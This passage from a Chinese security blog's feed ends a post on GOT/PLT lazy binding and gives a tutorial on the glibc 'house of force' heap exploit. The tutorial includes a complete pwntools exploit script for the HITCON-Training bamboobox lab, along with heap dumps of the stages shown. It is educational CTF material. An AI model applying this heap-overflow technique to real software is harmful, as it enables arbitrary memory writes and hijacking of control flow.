class="number">27</span>&gt;: pop    ebp</div><div class="line">Guessed arguments:</div><div class="line">arg[<span class="number">0</span>]: <span class="number">0xf7fb33dc</span> --&gt; <span class="number">0xf7fb41e0</span> --&gt; <span class="number">0x0</span></div><div class="line">arg[<span class="number">1</span>]: <span class="number">0xffffced0</span> --&gt; <span class="number">0x1</span></div><div class="line">arg[<span class="number">2</span>]: <span class="number">0x0</span></div></pre></td></tr></table></figure></p>
<p>接着跳转到 ds[0x804a010]（func@got）处，由于是第一次调用该函数，func@got 中的地址并非函数的真实地址，需要对其进行地址重定位。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x8048410</span> &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:<span class="number">0x804a00c</span></div><div class="line">   <span class="number">0x8048416</span> &lt;__libc_start_main@plt+<span class="number">6</span>&gt;: push   <span class="number">0x0</span></div><div class="line">   <span class="number">0x804841b</span> &lt;__libc_start_main@plt+<span class="number">11</span>&gt;:        jmp    <span class="number">0x8048400</span></div><div class="line">=&gt; <span class="number">0x8048420</span> &lt;func@plt&gt;:        jmp    DWORD PTR ds:<span class="number">0x804a010</span></div><div class="line"> | <span class="number">0x8048426</span> &lt;func@plt+<span class="number">6</span>&gt;:      push   <span class="number">0x8</span></div><div class="line"> | <span class="number">0x804842b</span> &lt;func@plt+<span class="number">11</span>&gt;:     jmp    <span class="number">0x8048400</span></div><div class="line"> | <span class="number">0x8048430</span>:   jmp    DWORD PTR ds:<span class="number">0x8049ffc</span></div><div class="line"> | <span class="number">0x8048436</span>:   xchg   ax,ax</div><div class="line"> |-&gt;   <span class="number">0x8048426</span> &lt;func@plt+<span class="number">6</span>&gt;:  push   <span class="number">0x8</span></div><div class="line">       <span class="number">0x804842b</span> &lt;func@plt+<span class="number">11</span>&gt;: jmp    <span class="number">0x8048400</span></div><div class="line">       <span class="number">0x8048430</span>:       jmp    DWORD PTR ds:<span class="number">0x8049ffc</span></div><div class="line">       <span class="number">0x8048436</span>:       xchg   ax,ax</div><div class="line">                                                                  JUMP is taken</div></pre></td></tr></table></figure></p>
<p>0x804a010 是 func 函数的重定位偏移，即重定位表中 func 符号的重定位入口。此时 0x804a010（func@got）中的地址为 0x8048426，即 PLT 中准备进行地址解析的指令地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">readelf -r test_lib1</div><div class="line"></div><div class="line">Relocation section '.rel.plt' at offset 0x3c0 contains 2 entries:</div><div class="line"> Offset     Info    Type            Sym.Value  Sym. Name</div><div class="line">0804a00c  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</div><div class="line">0804a010  00000407 R_386_JUMP_SLOT   00000000   func</div><div class="line"></div><div class="line">gdb-peda$ telescope 0x804a010</div><div class="line">0000| 0x804a010 --&gt; 0x8048426 (&lt;func@plt+6&gt;:    push   0x8)</div><div class="line">0004| 0x804a014 --&gt; 0x0</div><div class="line">0008| 0x804a018 --&gt; 0x0</div></pre></td></tr></table></figure></p>
<p>程序跳转到 0x8048426 后，又经过 2 次跳转到 ds[0x804a008] 处执行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x804841b</span> &lt;__libc_start_main@plt+<span class="number">11</span>&gt;:        jmp    <span class="number">0x8048400</span></div><div class="line">   <span class="number">0x8048420</span> &lt;func@plt&gt;:        jmp    DWORD PTR ds:<span class="number">0x804a010</span></div><div class="line">   <span class="number">0x8048426</span> &lt;func@plt+<span class="number">6</span>&gt;:      push   <span class="number">0x8</span></div><div class="line">=&gt; <span class="number">0x804842b</span> &lt;func@plt+<span class="number">11</span>&gt;:     jmp    <span class="number">0x8048400</span></div><div class="line"> | <span class="number">0x8048430</span>:   jmp    DWORD PTR ds:<span class="number">0x8049ffc</span></div><div class="line"> | <span class="number">0x8048436</span>:   xchg   ax,ax</div><div class="line"> | <span class="number">0x8048438</span>:   add    BYTE PTR [eax],al</div><div class="line"> | <span class="number">0x804843a</span>:   add    BYTE PTR [eax],al</div><div class="line"> |-&gt;   <span class="number">0x8048400</span>:       push   DWORD PTR ds:<span class="number">0x804a004</span></div><div class="line">       <span class="number">0x8048406</span>:       jmp    DWORD PTR ds:<span class="number">0x804a008</span></div><div class="line">       <span class="number">0x804840c</span>:       add    BYTE PTR [eax],al</div><div class="line">       <span class="number">0x804840e</span>:       add    BYTE PTR [eax],al</div><div class="line">                                                                  JUMP is taken</div></pre></td></tr></table></figure></p>
<p>ds[0x804a008] 处即为用于解析 func 地址的 _dl_runtime_resolve 函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0x80483fd</span>:   add    BYTE PTR [eax],al</div><div class="line">   <span class="number">0x80483ff</span>:   add    bh,bh</div><div class="line">   <span class="number">0x8048401</span>:   xor    eax,<span class="number">0x804a004</span></div><div class="line">=&gt; <span class="number">0x8048406</span>:   jmp    DWORD PTR ds:<span class="number">0x804a008</span></div><div class="line"> | <span class="number">0x804840c</span>:   add    BYTE PTR [eax],al</div><div class="line"> | <span class="number">0x804840e</span>:   add    BYTE PTR [eax],al</div><div class="line"> | <span class="number">0x8048410</span> &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:<span class="number">0x804a00c</span></div><div class="line"> | <span class="number">0x8048416</span> &lt;__libc_start_main@plt+<span class="number">6</span>&gt;: push   <span class="number">0x0</span></div><div class="line"> |-&gt;   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;:        push   eax</div><div class="line">       <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;:      push   ecx</div><div class="line">       <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;:      push   edx</div><div class="line">       <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;:      mov    edx,DWORD PTR [esp+<span class="number">0x10</span>]</div><div class="line">                                                                  JUMP is taken</div></pre></td></tr></table></figure></p>
<p>_dl_runtime_resolve 函数会将 func 函数的真实地址填充到 0x804a010（func@got）中，并返回到 func 函数中继续执行。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   <span class="number">0xf7fd051c</span> &lt;__x86.get_pc_thunk.dx&gt;:  mov    edx,DWORD PTR [esp]</div><div class="line">   <span class="number">0xf7fd051f</span> &lt;__x86.get_pc_thunk.dx+<span class="number">3</span>&gt;:        ret    </div><div class="line">   <span class="number">0xf7fd0520</span> &lt;func&gt;:   push   ebp</div><div class="line">=&gt; <span class="number">0xf7fd0521</span> &lt;func+<span class="number">1</span>&gt;: mov    ebp,esp</div><div class="line">   <span class="number">0xf7fd0523</span> &lt;func+<span class="number">3</span>&gt;: push   ebx</div><div class="line">   <span class="number">0xf7fd0524</span> &lt;func+<span class="number">4</span>&gt;: sub    esp,<span class="number">0x4</span></div><div class="line">   <span class="number">0xf7fd0527</span> &lt;func+<span class="number">7</span>&gt;: call   <span class="number">0xf7fd054b</span> &lt;__x86.get_pc_thunk.ax&gt;</div><div class="line">   <span class="number">0xf7fd052c</span> &lt;func+<span class="number">12</span>&gt;:        add    eax,<span class="number">0x1ad4</span></div><div class="line"></div><div class="line">gdb-peda$ telescope <span class="number">0x804a010</span></div><div class="line"><span class="number">0000</span>| <span class="number">0x804a010</span> --&gt; <span class="number">0xf7fd0520</span> (&lt;func&gt;: push   ebp)</div></pre></td></tr></table></figure></p>
<p>至此，使用延迟绑定的可执行文件中函数地址重定位已完成，当再次调用 func 函数时即可通过 jmp ds[0x804a010] 直接跳转到 func 函数中执行。</p>
<hr>
<p>References:<br>[1]《程序员的自我修养》<br>[2] <a href="http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/" target="_blank" rel="external">通过 GDB 调试理解 GOT/PLT</a><br>[3] <a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="external">手把手教你栈溢出从入门到放弃（下）</a></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PLT </tag>
            
            <tag> Lazy Binding </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux glibc heap house-of-force]]></title>
      <url>/2018/0419/linux-glibc-heap-houseofforce/</url>
      <content type="html"><![CDATA[<p>该利用方法通过堆溢出漏洞修改 top chunk 的 size 字段，使得 malloc 一块很大的内存可使用 top chunk 进行分配，当更新 top chunk 的 ptr 时会发生整数溢出，从而控制 top chunk ptr 为指定目标内存地址，如 .bss 段、.data 段和 GOT 表等。当再次使用 malloc 申请内存时将从目标内存处进行分配，之后对该内存进行写操作，即可实现任意地址写数据。</p>
<h1 id="0x01-TOP-Chunk"><a href="#0x01-TOP-Chunk" class="headerlink" title="0x01 TOP Chunk"></a>0x01 TOP Chunk</h1><p>堆内存是从低地址向高地址进行分配的，在堆内存的最高处存在着一块空闲 chunk 称为 top chunk。使用 malloc 分配内存时，若 bins 和 fast bins 中的 chunk 都不能满足分配需要则在 top chunk 中分出一块内存给用户。</p>
<p>top chunk 的大小跟随内存的分配和回收不停变换，如果从 top chunk 分配内存会导致 top chunk 减小，同时 top chunk 的指针增大；如果回收的 chunk 恰好与 top chunk 相邻，那么回收的 chunk 就会合并到 top chunk 中，从而使 top chunk 变大，top chunk 的指针减小。</p>
<p>glibc 中从 top chunk 分配内存的代码如下，首先会检查 top chunk 的大小是否能满足分配需求，同时还要确保分配完后剩余的大小不能小于最小 chunk 大小（MINSIZE），若满足该条件则进行分配。分配内存后需更新 top chunk 的 size 字段为 size - nb（nb 为新分配 chunk 的大小），top chunk ptr 更新为 ptr + nb。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* malloc.c in glibc-2.23 */</span></div><div class="line"><span class="comment">/* finally, do the allocation */</span></div><div class="line">  p = av-&gt;top;</div><div class="line">  size = chunksize (p);</div><div class="line"></div><div class="line"><span class="comment">/* check that one of the above allocation paths succeeded */</span></div><div class="line"><span class="comment">/* 若top chunk分割后，剩余的大小仍不小于最小chunk大小（MINSIZE），则进行分配。*/</span></div><div class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</div><div class="line">  &#123;</div><div class="line">      remainder_size = size - nb;   <span class="comment">// 更新top chunk的size</span></div><div class="line">      remainder = chunk_at_offset (p, nb);   <span class="comment">// 更新top chunk的ptr</span></div><div class="line">      av-&gt;top = remainder;</div><div class="line">      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</div><div class="line">      set_head (remainder, remainder_size | PREV_INUSE);</div><div class="line">      check_malloced_chunk (av, p, nb);</div><div class="line">      <span class="keyword">return</span> chunk2mem (p);   <span class="comment">// 返回新分配的内存地址</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></div><div class="line"></div><div class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></div></pre></td></tr></table></figure></p>
<p>下面以一个例子说明该过程，堆内存初始状态如下，top chunk 的大小为 0x20fe0，ptr为 0x603020，并且 bins 中没有空闲的 chunk。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  0x603000</div><div class="line">chunk      0x603000         0x20            (inuse)</div><div class="line">chunk      0x603020         0x20fe0         (top)</div><div class="line">sbrk_end   0x624000</div></pre></td></tr></table></figure></p>
<p>此时使用 malloc(0x45) 申请一个新 chunk，将会在 top chunk 中分配内存给该 chunk。新分配 chunk ptr 为 0x603020，即原 top chunk 的 ptr，大小为 0x50 = align(0x45 + 0x8)，其中 0x8 为 size 字段长度，对齐单位为 16 字节（32 bit 系统中为 8 字节）；分配完后，top chunk 的 size 为 0x20f90 = 0x20fe0-0x50，ptr 为 0x603070 = 0x603020+0x50；最后返回给用户的内存为 0x603030 = 0x603020+2*0x8。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  0x603000</div><div class="line">chunk      0x603000         0x20            (inuse)</div><div class="line">chunk      0x603020         0x50            (inuse)</div><div class="line">chunk      0x603070         0x20f90         (top)</div><div class="line">sbrk_end   0x624000</div><div class="line">gdb-peda$ info reg rax</div><div class="line">rax            0x603030 0x603030</div></pre></td></tr></table></figure></p>
<h1 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h1><p>在 top chunk 中分配一块很大的内存给新申请的 chunk，使得更新 top chunk 的 ptr 时发生整数溢出，从而控制 top chunk ptr 为指定目标内存地址，如 .bss 段、.data 段和 GOT 表等。当再次使用 malloc 申请内存时将返回目标内存地址，之后对该内存进行写操作，即可实现任意地址写数据。    </p>
<h2 id="1-修改-top-chunk-的-size-为大数"><a href="#1-修改-top-chunk-的-size-为大数" class="headerlink" title="1. 修改 top chunk 的 size 为大数"></a>1. 修改 top chunk 的 size 为大数</h2><p>从上面的分析可知，在 top chunk 中分配内存需要满足以下条件。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)</div></pre></td></tr></table></figure></p>
<p>由于 arena 的大小为 132KB，所以 top chunk 的 size 不大于 132KB（0x21000 bytes），因此在正常情况下通过 top chunk 分配的堆不能超过 0x21000 bytes，这导致无法在更新 top chunk 的 ptr 时发生整数溢出。为此，需要先利用堆溢出漏洞修改 top chunk 的 size 为一个大数，通常取 -1（其补码为 0xFFFFFFFFFFFFFFFF），之后便可通过 top chunk 申请一块很大的内存以触发整数溢出。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-19/51587433.jpg" alt="">     </p>
<h2 id="2-malloc-一块大内存，控制-top-chunk-ptr"><a href="#2-malloc-一块大内存，控制-top-chunk-ptr" class="headerlink" title="2. malloc 一块大内存，控制 top chunk ptr"></a>2. malloc 一块大内存，控制 top chunk ptr</h2><p>假设该步骤中申请内存时用户请求大小为 request_size；最终需控制的内存地址为 target；top chunk 的 ptr 初始值为 top_old，分配新 chunk 后的 ptr 为 top_new；由上一节中的分析可得到以下等式，其中 SIZE_SZ 在 64 bits 系统中为 8 bytes，32 bits 系统中为 4 bytes。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">top_new = top_old + align(request_size+ SIZE_SZ)  <span class="comment">// SIZE_SZ为size字段长度</span></div><div class="line">target = top_new + <span class="number">2</span>* SIZE_SZ  <span class="comment">// 2* SIZE_SZ为prev_size和size字段长度</span></div></pre></td></tr></table></figure></p>
<p>根据上式可得<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">request_size  = target - top_old - <span class="number">2</span>*SIZE_SZ - SIZE_SZ</div></pre></td></tr></table></figure></p>
<p> 需要注意的是 request_size+SIZE_SZ 要遵循块的对齐机制，如果未对齐应进行调整，将 request_size 的计算结果减去一个值（因为对齐时会增大长度使其对齐），使 request_size+SIZE_SZ 能对齐。</p>
<p>malloc 执行完后 top chunk ptr 将会更新，并指向目标内存 target-2* SIZE_SZ 处，即 top chunk 已转移到目标内存地址。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-19/65486405.jpg" alt=""><br><strong>由于计算 request_size 的大小需要知道堆内存中 top_old 的 ptr，所以得借助其他漏洞泄漏堆中 top chunk 的地址。或者可以将 target 指定在堆内存区域，那么通过本地调试可获得 top chunk 的地址，此时使用上式计算所得 request_size 相当于相对地址偏移，当堆基址改变后该值仍适用。</strong></p>
<h2 id="3-再次-malloc，返回目标内存"><a href="#3-再次-malloc，返回目标内存" class="headerlink" title="3. 再次 malloc，返回目标内存"></a>3. 再次 malloc，返回目标内存</h2><p>此时申请 chunk 将从目标内存处分配，最终成功返回目标内存 target，之后可对该内存写数据，以实现进一步的攻击。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-4-19/46291433.jpg" alt="">    </p>
<h1 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a>0x03 实例分析</h1><p>下面以 <a href="https://github.com/scwuaptx/HITCON-Training" target="_blank" rel="external">HITCON-Training</a> 中的 lab11 为例说明 house of force 的利用过程，题目文件和利用脚本也可在 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/heap_house-of-force" target="_blank" rel="external">Github</a> 中下载。</p>
<h2 id="1-漏洞"><a href="#1-漏洞" class="headerlink" title="1. 漏洞"></a>1. 漏洞</h2><p>程序中在修改 item 时调用 change_item() 函数，name 的长度由用户指定，并且没有进行检查。输入过长字符串到 name 中将会导致堆溢出，可覆盖 top chunk。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">void change_item()&#123;</div><div class="line">    ...</div><div class="line">    if(itemlist[index].name)&#123;</div><div class="line">        printf("Please enter the length of item name:");</div><div class="line">        read(0,lengthbuf,8);</div><div class="line">        length = atoi(lengthbuf);</div><div class="line">        printf("Please enter the new name of the item:");</div><div class="line">        readsize = read(0,itemlist[index].name,length);   // overflow</div><div class="line">        *(itemlist[index].name + readsize) = '\x00';</div><div class="line">    &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<h2 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2. 利用脚本"></a>2. 利用脚本</h2><h3 id="1）利用思路"><a href="#1）利用思路" class="headerlink" title="1）利用思路"></a>1）利用思路</h3><p>利用 house of force 使得 top chunk 转移到 box 结构体所在内存处，使得下次申请内存时从该地址开始进行分配，控制该内存块后可修改 box 结构体中的函数指针为 magic 函数地址；最后调用 goobye_message 函数时就跳转到 magic 函数执行，从而输出 flag。</p>
<h3 id="2）利用脚本"><a href="#2）利用脚本" class="headerlink" title="2）利用脚本"></a>2）利用脚本</h3><p>利用脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">r = process(<span class="string">'./bamboobox'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length,name)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.recvuntil(<span class="string">"name:"</span>)</div><div class="line">    r.sendline(str(length))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(name)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx,length,name)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"3"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(length))</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(name)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"4"</span>)</div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">    r.recvuntil(<span class="string">":"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line"></div><div class="line"></div><div class="line">magic = <span class="number">0x400d49</span></div><div class="line">raw_input(<span class="string">"malloc item0"</span>)</div><div class="line">additem(<span class="number">0x40</span>,<span class="string">"AAAA"</span>)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("modify item0,overite size of top chunk")</span></div><div class="line">modify(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>))</div><div class="line"></div><div class="line"><span class="comment">#raw_input("add a large chunk,control top chunk")</span></div><div class="line">additem(<span class="number">0x603010</span> - <span class="number">0x603070</span> - <span class="number">2</span>*<span class="number">8</span> - <span class="number">8</span>,<span class="string">"BBBB"</span>)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("return target,overwrite function ptr")</span></div><div class="line">additem(<span class="number">0x20</span>,p64(magic)*<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment">#raw_input("exit")</span></div><div class="line">r.sendline(<span class="string">'5'</span>)</div><div class="line">r.recvuntil(<span class="string">"Your choice:"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&#125;"</span>)</div></pre></td></tr></table></figure></p>
<h2 id="3-利用过程"><a href="#3-利用过程" class="headerlink" title="3. 利用过程"></a>3. 利用过程</h2><h3 id="1-添加-item0"><a href="#1-添加-item0" class="headerlink" title="1) 添加 item0"></a>1) 添加 item0</h3><p>添加item0后，堆内存分布如下，0x63000 处的 chunk0 为 box 结构体，结构体中包含 2 个函数指针。0x603020 处的 chunk1 为刚申请用于存放 name 的空间，并且 chunk1 与 top chunk 相邻。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span>&#123;</span></div><div class="line">    <span class="keyword">void</span> (*hello_message)();</div><div class="line">    <span class="keyword">void</span> (*goodbye_message)();</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  0x603000</div><div class="line">chunk      0x603000         0x20            (inuse)</div><div class="line">chunk      0x603020         0x50            (inuse)</div><div class="line">chunk      0x603070         0x20f90         (top)</div><div class="line">sbrk_end   0x624000</div><div class="line">gdb-peda$ x/20x 0x603000</div><div class="line">0x603000:       0x0000000000000000      0x0000000000000021</div><div class="line">0x603010:       0x0000000000400896      0x00000000004008b1</div><div class="line">0x603020:       0x0000000000000000      0x0000000000000051</div><div class="line">0x603030:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603040:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603050:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603060:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603070:       0x0000000000000000      0x0000000000020f91</div><div class="line">0x603080:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603090:       0x0000000000000000      0x0000000000000000</div></pre></td></tr></table></figure>
<h3 id="2-溢出-name"><a href="#2-溢出-name" class="headerlink" title="2) 溢出 name"></a>2) 溢出 name</h3><p>由于 change_item() 函数中 name 的长度由用户指定，并且程序没有对长度做限制，当指定修改的 name 长度大于 name 的内存大小时，将会导致越界写内存，从而可修改 top chunk 的 size 字段为-1。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  0x603000</div><div class="line">chunk      0x603000         0x20            (inuse)</div><div class="line">chunk      0x603020         0x50            (inuse)</div><div class="line">chunk      0x603070         0xfffffffffffffff8(top)</div><div class="line">sbrk_end   0x624000</div><div class="line">gdb-peda$ x/20x 0x603000</div><div class="line">0x603000:       0x0000000000000000      0x0000000000000021</div><div class="line">0x603010:       0x0000000000400896      0x00000000004008b1</div><div class="line">0x603020:       0x0000000000000000      0x0000000000000051</div><div class="line">0x603030:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603040:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603050:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603060:       0x6161616161616161      0x6161616161616161</div><div class="line">0x603070:       0x0000000000000000      0xffffffffffffffff</div><div class="line">0x603080:       0x0000000000000000      0x0000000000000000</div><div class="line">0x603090:       0x0000000000000000      0x0000000000000000</div></pre></td></tr></table></figure></p>
